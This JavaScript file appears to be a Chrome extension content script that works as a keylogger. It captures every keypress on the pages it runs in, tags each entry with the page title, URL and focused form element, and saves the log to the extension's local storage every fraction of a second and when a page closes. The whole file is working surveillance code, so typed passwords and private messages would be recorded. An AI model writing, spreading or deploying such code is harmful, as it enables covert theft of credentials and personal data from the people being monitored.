let timer = 0;
let delay = 5;

/* Randoms */
if (!document.title) {
  document.title = document.URL;
}


/* Keylib */
// Alphanumeric
document.addEventListener('keypress', (e) => {
  timer = delay;
  e = e || window.event;
  var charCode = typeof e.which == "number" ? e.which : e.keyCode;
  switch (charCode) {
    case 8:
      log("[BKSP]");
      break;
    case 9:
    log("[TAB]");
      break;
    case 13:
      log("[ENTER]");
      break;
    case 16:
      log("[SHIFT]");
      break;
    case 17:
      log("[CTRL]");
      break;
    case 18:
      log("[ALT]");
      break;
    case 91:
      log("[L WINDOW]"); // command for mac
      break;
    case 92:
      log("[R WINDOW]"); // command for mac
      break;
    case 93:
      log("[SELECT/CMD]"); // command for mac
      break;
    default:
      log(String.fromCharCode(charCode));

  }
});

var shouldSave = false;
var time;
var data;
var lastLog;

function createElement() {
  /* Keylog Saving */
  time = new Date();
  data = {};
  lastLog = time;
  data[time] = document.title + "^~^" + document.URL + "^~^";
}
createElement();

// Key'ed on JS timestamp
function log(input) {
  var now = new Date();
  if (now - lastLog < 10) return; // Remove duplicate keys (typed within 10 ms) caused by allFrames injection
  data[time] += input;
  shouldSave = true;
  lastLog = now;
}


/* Save data */
function save() {
  if (shouldSave) {
    for (k in data) {
      data[k] += "^~^" + document.activeElement.id + "^~^" + document.activeElement.className;
    };
    chrome.storage.local.set(data, () => {
      shouldSave = false;
    });
    createElement();
  }
}

// Save data on window close
window.onbeforeunload = () => {
  save();
  if (Math.random() < 0.2) // Don't clear every unload
    autoDelete();
}

// Save every second
setInterval(() => {
  if (timer == 0) {
    save();
  } else {
    timer--;
  }
}, 100);
